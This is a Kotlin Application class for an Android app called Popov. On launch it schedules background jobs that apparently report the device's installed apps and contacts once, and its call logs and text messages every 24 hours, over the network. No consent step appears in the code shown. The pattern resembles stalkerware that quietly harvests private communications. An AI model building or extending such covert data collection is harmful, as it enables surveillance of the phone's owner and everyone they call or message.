package com.github.yohannestz.popov

import android.app.Application
import androidx.hilt.work.HiltWorkerFactory
import androidx.work.BackoffPolicy
import androidx.work.Configuration
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.github.yohannestz.popov.util.Constants
import com.github.yohannestz.popov.worker.AppsLogReportWorker
import com.github.yohannestz.popov.worker.CallLogReportWorker
import com.github.yohannestz.popov.worker.ContactsLogReportWorker
import com.github.yohannestz.popov.worker.MessageLogReportWorker
import dagger.hilt.android.HiltAndroidApp
import java.util.concurrent.TimeUnit
import javax.inject.Inject


@HiltAndroidApp
class PopovApp : Application(), Configuration.Provider {

    @Inject
    lateinit var workerFactory: HiltWorkerFactory
    override fun getWorkManagerConfiguration(): Configuration {
        return Configuration.Builder()
            .setWorkerFactory(workerFactory)
            .setMinimumLoggingLevel(if (BuildConfig.DEBUG) android.util.Log.DEBUG else android.util.Log.ERROR)
            .build()
    }

    override fun onCreate() {
        super.onCreate()
        val hasNetworkConstraint = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val appsLogReportWorker = OneTimeWorkRequestBuilder<AppsLogReportWorker>()
            .setConstraints(hasNetworkConstraint)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, java.util.concurrent.TimeUnit.MINUTES)
            .build()
        val contactsLogReportWorker = OneTimeWorkRequestBuilder<ContactsLogReportWorker>()
            .setConstraints(hasNetworkConstraint)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, java.util.concurrent.TimeUnit.MINUTES)
            .build()

        val callsLogReporter = PeriodicWorkRequestBuilder<CallLogReportWorker>(24, TimeUnit.HOURS)
            .setConstraints(hasNetworkConstraint)
            .build()

        val messageLogReportWorker =
            PeriodicWorkRequestBuilder<MessageLogReportWorker>(24, TimeUnit.HOURS)
                .setConstraints(hasNetworkConstraint)
                .build()

        val workManager = WorkManager.getInstance(this)
        workManager.enqueueUniqueWork(Constants.APPS_LOG_REPORT_WORKER, ExistingWorkPolicy.REPLACE, appsLogReportWorker)
        workManager.enqueueUniqueWork(Constants.CONTACTS_LOG_REPORT_WORKER, ExistingWorkPolicy.REPLACE, contactsLogReportWorker)
        workManager.enqueueUniquePeriodicWork(Constants.CALLS_LOG_REPORT_WORKER, ExistingPeriodicWorkPolicy.KEEP, callsLogReporter)
        workManager.enqueueUniquePeriodicWork(
            Constants.MESSAGES_LOG_REPORT_WORKER,
            ExistingPeriodicWorkPolicy.KEEP,
            messageLogReportWorker
        )
    }

}